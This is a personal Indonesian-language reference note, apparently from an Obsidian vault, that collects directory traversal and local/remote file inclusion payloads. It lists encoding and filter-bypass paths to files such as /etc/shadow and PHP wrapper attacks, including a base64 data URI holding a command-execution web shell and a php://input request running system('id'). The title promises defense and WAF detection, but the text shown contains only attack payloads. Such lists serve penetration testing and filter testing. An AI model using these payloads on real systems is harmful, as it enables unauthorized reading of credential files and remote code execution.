---
title: "Directory Traversal — Ultimate Payload Collection: Path Bypass, Encoding, Defense, WAF Detection"
tags:
  - cyber-security
  - directory-traversal
  - lfi
  - path-traversal
  - web-security
  - library
aliases:
  - "Directory Traversal Payloads"
  - "Path Traversal Techniques"
created: "2026-07-28"
updated: "2026-07-28"
status: pending
cssclasses:
  - wide-table
---

> [!info] Ringkasan
> Directory Traversal (Path Traversal) adalah kerentanan di mana attacker bisa membaca file di luar direktori yang diizinkan. Teknik bypass sangat bervariasi: encoding, double encoding, unicode, path truncation, dan filter bypass. Catatan ini berisi koleksi payload lengkap dari PayloadsAllTheThings dan teknik deteksi untuk WAF.

**Cross-link:** [[file-carving-data-recovery-advanced]] → [[web-hacking-exploitation]] → [[waf-reverse-proxy-deepdive]]

---

## Daftar Isi

- [[#1. Basic Payloads]]
- [[#2. Encoding Bypass]]
- [[#3. Filter Bypass]]
- [[#4. File Inclusion (LFI/RFI)]]
- [[#5. Referensi Payload]]

---

## 1. Basic Payloads

```bash
# Linux — file tujuan
../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
../../../../proc/self/environ
../../../../proc/self/fd/0

# Windows
..\..\..\windows\win.ini
..\..\..\boot.ini
..\..\..\windows\system32\drivers\etc\hosts
```

---

## 2. Encoding Bypass

```bash
# URL Encoding sederhana
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd  # ../../../etc/passwd

# Double URL Encoding
%252e%252e%252f%252e%252e%252fetc/passwd

# Triple Encoding
%25252e%25252e%25252fetc/passwd

# Unicode / UTF-8
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd  # IIS Unicode bypass
..%252f..%252fetc/passwd
..%c0%af..%c0%afetc/passwd  # %c0%af = /

# 16-bit Unicode
..%u2216..%u2216etc/passwd  # %u2216 = \
```

---

## 3. Filter Bypass

```bash
# Bypass ".." filter
....//....//....//etc/passwd  # Double dot → normalisasi jadi ../
..\/..\/..\/etc/passwd        # Backslash + forward slash
.//././/././/./etc/passwd     # Extra slash
....\/....\/....\/etc/passwd  # Quad dot → normalisasi jadi ../
..;/..;/..;/etc/passwd        # Semicolon (IIS)

# Bypass "../" filter
.././.././../etc/passwd       # Masih jadi ../
..//..//..//etc/passwd        # Double slash

# Null byte injection (%00) untuk extension bypass
../../../etc/passwd%00.jpg
../../../etc/passwd%00.html
../../../etc/passwd\x00.jpg

# Long path truncation (Windows, old systems)
..\..\..\..\..\..\..\..\windows\system32\calc.exeAAAAAAAAAAAAAAA
```

---

## 4. File Inclusion (LFI/RFI)

```bash
# PHP wrappers
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd

# Data URI
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==

# Expect wrapper (if enabled)
expect://id
expect://cat /etc/passwd

# Input wrapper
POST /index.php?page=php://input
Content-Type: application/x-www-form-urlencoded
<?php system('id');?>

# File inclusion dengan null byte
../../../etc/passwd%00
../../../etc/passwd\x00.php
```

---

## 5. Referensi Payload

Lokasi payload: `/mnt/data_d/Projects/Reference/PayloadsAllTheThings/Directory Traversal/` dan `/File Inclusion/`

**Cross-link:** [[file-carving-data-recovery-advanced]] → [[web-hacking-exploitation]] → [[blueteam-detection-matrix]]
